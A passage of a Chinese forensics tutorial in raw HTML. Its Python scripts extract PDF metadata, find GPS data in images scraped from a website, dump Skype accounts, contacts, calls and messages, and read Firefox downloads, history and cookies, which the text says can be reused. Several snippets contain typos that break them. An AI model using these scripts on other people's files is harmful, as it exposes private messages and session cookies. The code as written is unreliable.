title="1.用PyPDF解析PDF元数据"></a>1.用PyPDF解析PDF元数据</h3><ul><li>PyPDF（pybrary.net/pyPdf）是一个优秀的第三方管理PDF文件很实用的库，提供了文档的信息提取，分割，合并，加密和解密的功能</li><li>用函数getDocumentInfo()提取元数据。该方法返回一个元组数组，每个元组包含一个元数据和它的值。遍历这个数组可打印PDF文件的全部元数据</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">printMeta</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">:</span>    pdfFile<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span>file<span class="token punctuation">(</span>fileName<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    docInfo<span class="token operator">=</span>pdfFile<span class="token punctuation">.</span>getDocnumentInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] PDF MetaData For:'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> metaItem <span class="token keyword">in</span> docInfo<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token string">'[+]'</span><span class="token operator">+</span>metaItem<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>docInfo<span class="token punctuation">[</span>metaItem<span class="token punctuation">]</span></code></pre><p>选项分析器提取命令行参数识别特定的文件，例如下载的Anonymous新闻稿</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'usage %prog -F &lt;PDF file name>'</span><span class="token punctuation">)</span>                                            <span class="token comment" spellcheck="true">#程序名</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-F'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'fileName'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'specify PDF filename'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义命令行参数，-F后的参数解析为filename</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回“字典”options中是需要选项，“列表”args中是错误的输入</span>    fileName<span class="token operator">=</span>options<span class="token punctuation">.</span>fileName    <span class="token keyword">if</span> fileName<span class="token operator">==</span>None<span class="token punctuation">:</span>        <span class="token keyword">print</span> parser<span class="token punctuation">.</span>usage        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        printMeta<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span></code></pre><h2 id="四、Exif元数据"><a href="#四、Exif元数据" class="headerlink" title="四、Exif元数据"></a>四、Exif元数据</h2><ul><li>交换图像文件格式（Exif）标准的定义了如何存储图像和视频文件的规范，Exif信息简介（blogs.csdn.net/fioletfly/article/details/53605959）</li><li>Exif格式就是在JPEG格式头部插入了数码照片的信息（在jpg文件头中的一个FFE1打头的注释段），包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS、缩略图等</li><li>士兵将Exif格式的照片放到博客或网站上，敌方可以下载所有的照片进而推断调动信息</li><li>用BeautifulSoup（需要安装）下载图像<ul><li><a href="http://www.crummy.com/software/BeautifulSoup" target="_blank" rel="noopener">www.crummy.com/software/BeautifulSoup</a></li><li>快速解析HTML和XML文档，获取其中的图像</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib2<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">def</span> <span class="token function">findImages</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Finding images on'</span><span class="token operator">+</span>url<span class="token punctuation">)</span>    urlContent<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用urllib2读取web文档</span>    soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>urlContent<span class="token punctuation">)</span>    imgTags<span class="token operator">=</span>soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#提取所有的图像标签</span>    <span class="token keyword">return</span> imgTags    <span class="token comment" spellcheck="true">#返回一个包含所有图像标签的数组</span></code></pre><ul><li>接下来从网站下载图像，在函数中进行检查是否包含GPS元数据</li><li>用Python的图像库PIL从图像读取Exif元数据</li><li>图片打开为PIL图像对象，用getexif()获取Exif信息</li><li>查询EXIF.Tags内容（<a href="http://www.douban.com/note/575698833/）" target="_blank" rel="noopener">www.douban.com/note/575698833/）</a></li><li>由tag数-&gt;Exif字段名-&gt;Exif字段值</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#综合代码exifFetch.py，连接到一个URL，解析并下载所有的图像文件，然后测试每个文件的Exif元数据</span><span class="token keyword">import</span> urllib2<span class="token keyword">import</span> optparse<span class="token keyword">from</span> urlparse <span class="token keyword">import</span> urlsplit<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> PIL<span class="token punctuation">.</span>ExifTags <span class="token keyword">import</span> TAGS<span class="token keyword">def</span> <span class="token function">findImages</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Finding images on'</span><span class="token operator">+</span>url<span class="token punctuation">)</span>    urlContent<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用urllib2读取web文档</span>    soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>urlContent<span class="token punctuation">)</span>    imgTags<span class="token operator">=</span>soup<span class="token punctuation">.</span>findAll<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#提取所有的图像标签</span>    <span class="token keyword">return</span> imgTags    <span class="token comment" spellcheck="true">#返回一个包含所有图像标签的数组</span><span class="token keyword">def</span> <span class="token function">downloadImage</span><span class="token punctuation">(</span>imgTag<span class="token punctuation">)</span><span class="token punctuation">:</span>    tyr<span class="token punctuation">:</span>        imgSrc<span class="token operator">=</span>imgTag<span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#从图像标签中提取图片url</span>        imgContent<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#下载</span>        imgFileName<span class="token operator">=</span>basename<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#返回文件名（路径名中删除目录）；url拆分：协议 域名 路径 参数 段落</span>        imgFile<span class="token operator">=</span>open<span class="token punctuation">(</span>imgFileName<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#本地创存图片</span>        imgFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>imgContent<span class="token punctuation">)</span>        imgFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> imgFileName    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">testForExif</span><span class="token punctuation">(</span>imgFileName<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        exifData<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>        imgFile<span class="token operator">=</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>imgFileName<span class="token punctuation">)</span>        info<span class="token operator">=</span>imgFile<span class="token punctuation">.</span>_geetexif<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> info<span class="token punctuation">:</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>tag<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token keyword">in</span> info<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                decoded<span class="token operator">=</span>TAGS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tag<span class="token punctuation">,</span>tag<span class="token punctuation">)</span>                exifData<span class="token punctuation">[</span>decoded<span class="token punctuation">]</span><span class="token operator">=</span>value            exifGPS<span class="token operator">=</span>exifData<span class="token punctuation">[</span><span class="token string">'GPSInfo'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> exifGPS<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]'</span><span class="token operator">+</span>imgFileName<span class="token operator">+</span>\<span class="token string">'contains GPS MetaData'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'user %prog "+\ "-u &lt;target url>'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'url'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'specify url address'</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    url<span class="token operator">=</span>options<span class="token punctuation">.</span>url    <span class="token keyword">if</span> url <span class="token operator">==</span> None<span class="token punctuation">:</span>        <span class="token keyword">print</span> parser<span class="token punctuation">.</span>usage        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        imgTags<span class="token operator">=</span>findImages<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">for</span> imgTag <span class="token keyword">in</span> imgTags<span class="token punctuation">:</span>            imgFileName<span class="token operator">=</span>downloadImage<span class="token punctuation">(</span>imgTag<span class="token punctuation">)</span>            testForExif<span class="token punctuation">(</span>imgFileName<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="五、用Python分析应用程序的使用记录"><a href="#五、用Python分析应用程序的使用记录" class="headerlink" title="五、用Python分析应用程序的使用记录"></a>五、用Python分析应用程序的使用记录</h2><ul><li><p>SQLite用于许多流行的应用程序中，被Apple，Mozilla，Google，McAfee，Microsoft，Intuit，GE，DropBox，Adobe甚至是Airbus等公司内建到应用程序中使用</p></li><li><p>了解如何解析SQLite数据库对于在调查取证中使用Python自动处理是非常有用的</p></li><li><p>SQLite数据库以文件形式存储</p></li><li><p>Skype中的SQLite3数据库</p><ul><li>在Windows系统中，Skype中的SQLite3数据库名为main.db，在路径C:\Documents and Settings&lt;User&gt;\ApplicationData\Skype&lt;Skypeaccount&gt;目录下，在MAC OS X系统中，该数据库位于/Users/<user>/Library/Application/Support/Skype/<skype-account>目录下</skype-account></user></li><li>连接到数据库，其中包含存储电话，账户，消息甚至是SMS消息的表，Accounts表中包括用户的名字，Skype的简称，用户的位置，账户的创建日期等信息</li></ul></li><li><p>用Python+Sqlite3查询Skype数据库</p><ul><li>Accounts(fullname,skypename,city,country,profile_timestamp)</li><li>Contacts(displayname,skypename,city,country,phone_mobile,birthday)</li><li>Calls(conv_dbid,begin_timestamp, …)</li><li>Conversations(id,identity, …)</li><li>Messages(timestamp,dialog_partner,author,body_xml)</li></ul></li></ul><p>综合代码skypeParse.py，打印账户信息，联系人地址，通话记录和消息</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># skypeParse.py</span><span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> optparse<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">printProfile</span><span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>    c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>"SELECT fullname<span class="token punctuation">,</span> skypename<span class="token punctuation">,</span> city<span class="token punctuation">,</span> country<span class="token punctuation">,</span> datatime<span class="token punctuation">(</span>profile_timestamp<span class="token punctuation">,</span>        <span class="token string">'unixepoch'</span><span class="token punctuation">)</span> FROM Accounts<span class="token punctuation">;</span>"<span class="token punctuation">)</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] -- Found Account --'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] User            : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Skype Username  : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Location        : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Profile Data    : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printContacts</span><span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>    c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>"SELECT displayname<span class="token punctuation">,</span> skypename<span class="token punctuation">,</span> city<span class="token punctuation">,</span> country<span class="token punctuation">,</span>        phone_mobile<span class="token punctuation">,</span> birthday FROM Contacts<span class="token punctuation">;</span>"<span class="token punctuation">)</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] -- Found Contact --'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] User            : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Skype Username  : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'None'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Location        : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">','</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'None'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Mobile Number   : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'None'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Birthday        : '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printCallLog</span><span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>    c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>"SELECT datatime<span class="token punctuation">(</span>begin_timestamp<span class="token punctuation">,</span><span class="token string">'unixepoch'</span><span class="token punctuation">,</span>\        identity FROM calls<span class="token punctuation">,</span> conversations WHERE \        calls<span class="token punctuation">.</span>conv_dbid<span class="token operator">=</span>conversations<span class="token punctuation">.</span>id<span class="token punctuation">;</span>"<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] -- Found Calls --'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Time: '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>\                <span class="token string">' | Partner: '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printMessages</span><span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>    c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>"SELECT datatime<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span><span class="token string">'unixepoch'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\        dialog_partner<span class="token punctuation">,</span>author<span class="token punctuation">,</span>body_xml FROM Messages<span class="token punctuation">;</span>'<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] --Found Messages --'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">'partlist'</span> <span class="token operator">not</span> <span class="token keyword">in</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    msgDirection<span class="token operator">=</span><span class="token string">'To'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">':'</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    msgDirection<span class="token operator">=</span><span class="token string">'From'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">':'</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Time'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>msgDirection<span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">"usage %prog "</span><span class="token operator">+</span><span class="token string">"-p&lt;skype profile path>"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'pathName'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>\        help<span class="token operator">=</span><span class="token string">'specify skype profile path'</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    pathName<span class="token operator">=</span>options<span class="token punctuation">.</span>pathName    <span class="token keyword">if</span> pathName<span class="token operator">==</span>None<span class="token punctuation">:</span>        <span class="token keyword">print</span> parser<span class="token punctuation">.</span>usage        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>pathName<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">False</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[l] Path Dose Not Exist: '</span><span class="token operator">+</span>pathName<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        skypeDB<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>pathName<span class="token punctuation">,</span><span class="token string">'main.db'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span><span class="token punctuation">:</span>            printProfile<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>            printContacts<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>            printCallLog<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>            printMessages<span class="token punctuation">(</span>skypeDB<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[l] Skype Database '</span> <span class="token operator">+</span> <span class="token string">'does not exist: '</span><span class="token operator">+</span>skypeDB<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="六、用Python解析火狐（FireFox）的Sqlite3数据库"><a href="#六、用Python解析火狐（FireFox）的Sqlite3数据库" class="headerlink" title="六、用Python解析火狐（FireFox）的Sqlite3数据库"></a>六、用Python解析火狐（FireFox）的Sqlite3数据库</h2><ul><li>火狐Sqlite3数据库由多个数据文件组成</li><li>更新sqlite3以适应最新版的FireFox</li><li>Windows中位于C:\Documents and Settings&lt;USER&gt;\Application Data\Mozilla\Firefox\Profiles&lt;profilefolder&gt;</li><li>MAC OS X系统中存储在/Users/<user>/Library/Application/Support/Firefox/Profiles/<profilefolder>目录下</profilefolder></user></li><li>综合代码firefoxParse.py查询火狐浏览器的下载文件信息，读取   cookies和浏览历史以及Google搜索历史<ul><li>downloads.sqlite文件中的moz_downloads表存储文件名，下载源，下载日期，文件大小，本地存储位置等信息，火狐将Unix日期时间乘以1000000，因此正确的时间是相应字段除以1000000</li><li>cookies.sqlite文件中可以从moz_cookies表提取主机，名称，cookies的值并重用</li><li>places.sqlite文件中的moz_places表和moz_historyvisits表包含浏览历史，例如Google查询的关键字位于URL中“q=”和“&amp;”之间，提取后将其中关键字分隔符“+”替换为空格以便阅读</li><li>不同系统中，\、/含义不同，创建文件完整路径时需要考虑<ul><li>downloadDB=os.path.join(pathName,”downloads.sqlite”)</li><li>downloadDB=pathName+”\downloads.sqlite”</li></ul></li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> optparse<span class="token keyword">import</span> os<span class="token keyword">import</span> sqlite3<span class="token keyword">def</span> <span class="token function">printDownloads</span><span class="token punctuation">(</span>downloadDB<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>downloadDB<span class="token punctuation">)</span>    c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>'SELECT name<span class="token punctuation">,</span> source<span class="token punctuation">,</span> datatime<span class="token punctuation">(</span>endTime<span class="token operator">/</span><span class="token number">1000000</span><span class="token punctuation">,</span>\        \<span class="token string">'unixepoch\') FROM moz_downloads;'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] --- Files Downloaded ---'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] File: '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'from source: '</span>\            <span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' at: '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printCookied</span><span class="token punctuation">(</span>cookiesDB<span class="token punctuation">)</span><span class="token punctuation">:</span>··· ···<span class="token keyword">def</span> <span class="token function">printHistory</span><span class="token punctuation">(</span>placesDB<span class="token punctuation">)</span><span class="token punctuation">:</span>··· ···<span class="token keyword">def</span> <span class="token function">printGoogle</span><span class="token punctuation">(</span>placesDB<span class="token punctuation">)</span><span class="token punctuation">:</span>··· ···<span 